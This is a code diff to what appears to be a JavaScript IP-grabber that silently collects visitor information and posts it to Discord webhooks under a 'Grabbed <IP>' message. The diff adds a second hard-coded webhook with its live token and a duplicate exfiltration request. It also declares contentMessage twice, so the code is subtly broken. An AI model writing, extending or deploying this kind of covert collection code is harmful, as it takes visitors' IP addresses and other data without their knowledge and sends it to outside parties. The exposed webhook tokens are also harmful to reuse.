@@ -1,4 +1,5 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn';
+const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1448713634111815691/aUP_IgLHFpoYGYvUZmxauDVGCWdj-7ZW7lDfhLgXkP9UeOFrR_N_3pramrO7jHHbaKsT';
 
 let visitorInfo = {};
 
@@ -527,14 +528,25 @@ async function collectAndSendInfo() {
             footer: { text: "자동 수집 시스템" }
         };
 
-        const payload = { embeds: [embed] };
+        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719>`;
 
+        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719>`;
+        
+        const payload = { 
+            content: contentMessage,
+            embeds: [embed] 
+        };
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-
+        await fetch(WEBHOOK_URL_2, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
     } catch (error) {
         console.error('정보 수집/전송 실패:', error);
     }
